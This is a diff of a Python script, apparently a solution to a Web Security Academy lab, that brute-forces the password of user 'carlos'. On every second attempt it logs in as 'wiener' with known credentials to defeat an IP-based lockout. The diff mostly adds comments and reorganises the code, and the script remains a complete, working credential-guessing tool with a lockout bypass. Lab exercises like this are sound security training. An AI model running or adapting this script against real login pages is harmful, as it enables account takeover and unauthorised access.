@@ -12,26 +12,20 @@
 #
 #################################################################
 
+
 ###########
 # imports
 ###########
 import requests
-import re
 import time
 from colorama import Fore
+
 
 #############################
 # Global Variables
 #############################
 FAILED_PASSWORDS = []
 FAILED_PASSWORDS_COUNTER = 0
-
-# change this to your lab URL
-url = "https://0a1b00e4045d76eb8237443600e900d8.web-security-academy.net/login"
-# change the paths to your lists
-passwords = open("/home/ahmed/passwords",
-                 'rt').read().splitlines()
-
 
 
 #####################################
@@ -48,45 +42,67 @@ def print_progress(elapsed_time, fail_counter, success_counter, total_counts, te
 def brute_force_password(start_time, url, valid_user, passwords):
     global FAILED_PASSWORDS
     global FAILED_PASSWORDS_COUNTER
+    
     print(Fore.WHITE + "[#] Brute forcing password..")
     print(Fore.GREEN + "✅ Valid user: " + valid_user)
-    total_passwords = len(passwords)  # number of all passwords
+    
+    # get the number of all passwords
+    total_passwords = len(passwords)  
+
     for (index, password) in enumerate(passwords):
+        # make a valid login after every password try
         if index % 2 == 0:
+            # set data to send via POST
             data = {
                 "username": "wiener",
                 "password": "peter"
             }
-            try:  # try to send correct creds
-                response = requests.post(
-                    url, data, allow_redirects=False)
-                if response.status_code == 302:  # valid password
-                    print(Fore.BLUE + "\nSend correct creds.. ☑️")
-                else:
-                    print(Fore.RED + "\n[!] Couldn't send correct creds")
+
+            try:  
+                # login as wiener to make a successful login
+                response = requests.post(url, data, allow_redirects=False)
+                
             except:
                 print(Fore.RED + "\n[!] Couldn't send correct creds throuhg exception")
-        # calculate elapsed time
+        
+            # if login is successful
+            if response.status_code == 302:  
+                print(Fore.BLUE + "\nSend correct creds.. OK")
+            
+            else:
+                print(Fore.RED + "\n[!] Couldn't send correct creds")
+                
+        # calculate the elapsed time
         elapsed_time = (int((time.time() - start_time) / 60))
-        print_progress(elapsed_time, FAILED_PASSWORDS_COUNTER,
-                       index, total_passwords, password)
-        # POST data to submit
+        
+        print_progress(elapsed_time, FAILED_PASSWORDS_COUNTER, index, total_passwords, password)
+        
+        # set data to send via POST
         data = {
             "username": valid_user,
             "password": password
         }
-        try:  # try to login
-            response = requests.post(
-                url, data, allow_redirects=False, timeout=5)
-            if response.status_code == 302:  # valid password
-                return password
-            else:
-                pass
+
+        try:  
+            # try to login with the password
+            response = requests.post(url, data, allow_redirects=False, timeout=5)
+            
         except:
-            FAILED_PASSWORDS_COUNTER += 1  # update the failed counter
+            # update the failed counter
+            FAILED_PASSWORDS_COUNTER += 1  
             # save the failed password to try it later
             FAILED_PASSWORDS.append(password)
-    None
+            continue
+    
+        # if valid password is found and login is successful
+        if response.status_code == 302:  
+            return password
+        
+        else:
+            continue
+        
+    # if no passwords are found
+    return None
 
 
 ##################################
@@ -95,46 +111,70 @@ def brute_force_password(start_time, url, valid_user, passwords):
 def save_results(elapsed_time, file_name, valid_user, valid_password):
     global FAILED_PASSWORDS
     global FAILED_PASSWORDS_COUNTER
+    
+    # results to saved in a file
     to_save = f"""
     ✅ Finished in: {elapsed_time} minutes \n\n\
     Username: {valid_user}, Password: {valid_password} \n\n\
     [!] Failed passwords count: {FAILED_PASSWORDS_COUNTER} \n\
     [!] Failed passwords: {FAILED_PASSWORDS} \n\n"""
+    
     try:
+        # create a file to save results in
         new_file = open(file_name, "x")
+
+        # write results to the file
         new_file.write(to_save)
-        print(Fore.YELLOW + f"Results was saved to: {file_name}")
+
+        print(Fore.YELLOW + f"\nResults was saved to: {file_name}")
+    
     except:
         print(Fore.RED + "Couldn't create the file to save results")
 
 
-###############################
-# Starting point of the script
-###############################
-start_time = time.time()  # capture the time before enumeration
-valid_user = "carlos"  # start the enumeration
-valid_password = brute_force_password(
-    start_time, url, "carlos", passwords)  # brute force his password
-if valid_password != None:  # if a valid password was found
-    elapsed_time = int((time.time() - start_time) /
-                       60)  # calculate elapsed time
-    print("")
-    print(Fore.GREEN + "✅ Login successfully: " + Fore.WHITE + " username: " +
+###########
+# Main
+###########
+
+# change this to your lab URL
+url = "https://0a1300bf046fc9a78242d05b00f7009c.web-security-academy.net/login"
+
+# change the file path of the password list
+passwords = open("/home/ahmed/passwords", 'rt').read().splitlines()
+
+# capture the time before enumeration
+start_time = time.time()  
+
+# set valid username
+valid_user = "carlos"  
+
+# start brute forcing
+valid_password = brute_force_password(start_time, url, "carlos", passwords) 
+
+# if a valid password was found
+if valid_password != None:  
+    # calculate the elapsed time
+    elapsed_time = int((time.time() - start_time) / 60) 
+
+    print(Fore.GREEN + "\n\n✅ Login successfully: " + Fore.WHITE + " username: " +
           Fore.GREEN + valid_user + Fore.WHITE + ", password: " + Fore.GREEN + valid_password)
-    print(Fore.GREEN + "✅ Finished in: " +
-          Fore.WHITE + str(elapsed_time) + " minutes")
+    print(Fore.GREEN + "✅ Finished in: " + Fore.WHITE + str(elapsed_time) + " minutes")
+    
+    # save the results
     save_results(elapsed_time, "results", valid_user, valid_password)
+
 else:  # no valid password was found
-    elapsed_time = int((time.time() - start_time) /
-                       60)  # calculate elapsed time
+    # calculate the elapsed time
+    elapsed_time = int((time.time() - start_time) / 60)  
+    
     print("")
     print(Fore.RED + "[!] Couldn't find a valid password")
-    print(Fore.GREEN + "Finished in: " +
-          Fore.WHITE + str(elapsed_time) + " minutes")
+    print(Fore.GREEN + "Finished in: " + Fore.WHITE + str(elapsed_time) + " minutes")
+
+    # save the results
     save_results(elapsed_time, "results", valid_user, "")
 
 
-print(Fore.RED + "Failed passwords count: " +
-      Fore.WHITE + str(FAILED_PASSWORDS_COUNTER))
-print(Fore.RED + "Failed passwords: " + Fore.WHITE +
-      "[ " + ", ".join(FAILED_PASSWORDS) + " ]")
+# print failed passwords
+print(Fore.RED + "\nFailed passwords count: " + Fore.WHITE + str(FAILED_PASSWORDS_COUNTER))
+print(Fore.RED + "Failed passwords: " + Fore.WHITE + "[ " + ", ".join(FAILED_PASSWORDS) + " ]")
